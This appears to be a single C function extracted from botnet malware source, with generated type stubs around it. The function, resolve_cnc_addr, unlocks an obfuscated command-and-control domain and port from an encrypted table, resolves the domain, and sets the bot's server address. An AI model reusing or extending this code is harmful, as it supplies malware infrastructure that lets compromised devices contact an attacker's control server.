#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */
typedef  struct TYPE_4__   TYPE_2__ ;
typedef  struct TYPE_3__   TYPE_1__ ;

/* Type definitions */
struct resolv_entries {size_t addrs_len; int /*<<< orphan*/ * addrs; } ;
typedef  int /*<<< orphan*/  port_t ;
struct TYPE_3__ {int /*<<< orphan*/  s_addr; } ;
struct TYPE_4__ {int /*<<< orphan*/  sin_port; TYPE_1__ sin_addr; } ;

/* Variables and functions */
 int /*<<< orphan*/  TABLE_CNC_DOMAIN ; 
 int /*<<< orphan*/  TABLE_CNC_PORT ; 
 int /*<<< orphan*/  printf (char*) ; 
 size_t rand_next () ; 
 int /*<<< orphan*/  resolv_entries_free (struct resolv_entries*) ; 
 struct resolv_entries* resolv_lookup (scalar_t__) ; 
 TYPE_2__ srv_addr ; 
 int /*<<< orphan*/  table_lock_val (int /*<<< orphan*/ ) ; 
 scalar_t__ table_retrieve_val (int /*<<< orphan*/ ,int /*<<< orphan*/ *) ; 
 int /*<<< orphan*/  table_unlock_val (int /*<<< orphan*/ ) ; 

__attribute__((used)) static void resolve_cnc_addr(void)
{
    struct resolv_entries *entries;

    table_unlock_val(TABLE_CNC_DOMAIN);
    entries = resolv_lookup(table_retrieve_val(TABLE_CNC_DOMAIN, NULL));
    table_lock_val(TABLE_CNC_DOMAIN);
    if (entries == NULL)
    {
#ifdef DEBUG
        printf("[main] Failed to resolve CNC address\n");
#endif
        return;
    }
    srv_addr.sin_addr.s_addr = entries->addrs[rand_next() % entries->addrs_len];
    resolv_entries_free(entries);

    table_unlock_val(TABLE_CNC_PORT);
    srv_addr.sin_port = *((port_t *)table_retrieve_val(TABLE_CNC_PORT, NULL));
    table_lock_val(TABLE_CNC_PORT);

#ifdef DEBUG
    printf("[main] Resolved domain\n");
#endif
}